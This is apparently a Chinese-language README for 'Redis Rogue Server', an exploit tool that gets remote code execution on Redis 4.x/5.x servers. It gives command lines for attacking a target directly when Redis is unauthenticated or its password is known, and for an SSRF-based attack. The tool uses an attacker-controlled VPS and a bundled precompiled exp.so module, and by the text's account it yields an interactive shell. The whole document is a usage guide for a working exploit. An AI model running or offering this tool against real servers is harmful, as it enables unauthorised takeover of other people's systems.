# Redis Rogue Server

Redis 4.x/Redis 5.x RCE利用脚本, 涉及技术点可参考 [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

经测试Redis 5.0.8也可以使用，没有出现ppt上写的5.0无法set/get config的情况.

## Usage:

编译.so模块, 代码: <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

将.so与 `redis-rogue-server.py`放置在同一目录下

项目自带了一个编译好的的exp.so文件, 可直接使用

### 攻击场景1 - Redis未授权访问/已知Redis口令

启动redis rogue server，并主动连接目标redis服务发起攻击

```bash
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

参数说明：
- `--rpasswd` 如果目标Redis服务开启了认证功能，可以通过该选项指定密码
- `--rhost` 目标redis服务IP
- `--rport` 目标redis服务端口，默认为6379
- `--lhost` vps的外网IP地址
- `--lport` vps监控的端口，默认为21000

攻击成功之后，你会得到一个交互式shell

### 攻击场景2 - 通过SSRF攻击Redis

在SSRF的场景下，可以使用`--server-only`选项

```bash
python3 redis-rogue-server.py --server-only
```

参数说明：

- `--server-only` 仅启动redis rogue server, 不主动连接目标redis